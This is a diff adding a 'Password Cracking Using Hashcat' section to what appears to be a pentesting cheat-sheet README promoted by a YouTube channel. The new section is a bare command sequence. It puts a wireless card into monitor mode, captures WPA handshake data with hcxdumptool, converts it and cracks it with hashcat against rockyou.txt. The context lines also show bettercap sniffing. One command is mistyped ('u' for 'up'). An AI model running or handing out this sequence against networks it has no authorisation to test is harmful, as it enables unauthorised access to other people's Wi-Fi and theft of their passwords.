@@ -198,5 +198,41 @@ for scan target browsed
 net.sniff on 
 ```
 
+# Password Cracking Using Hashcat
+```sh
+sudo airmon-ng check kill
+```
+
+```sh
+sudo systemctl stop NetworkManager.service
+sudo systemctl stop wpa_supplicant.service
+```
+
+```sh
+sudo ip link set wlan0 down
+sudo iw dev wlan0 set type monitor
+sudo ip link set wlan0 u
+```
+
+```sh
+sudo hcxdumptool -i wlan0 -w dumpfile.pcapng
+```
+
+```sh
+hcxpcapngtool -o hash.hc22000 -E <essid> essidlist dumpfile.pcapng
+```
+
+```sh
+hashcat -a 0 -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -D 2
+```
+
+```sh
+hashcat -m 22000 hash.hc22000 wordlist.txt
+```
+```sh
+sudo systemctl start wpa_supplicant.service
+sudo systemctl start NetworkManager.service
+```
+
 ### =}> [Keep Supporting me on YouTube](https://www.youtube.com/@ohm_vishwa)
 
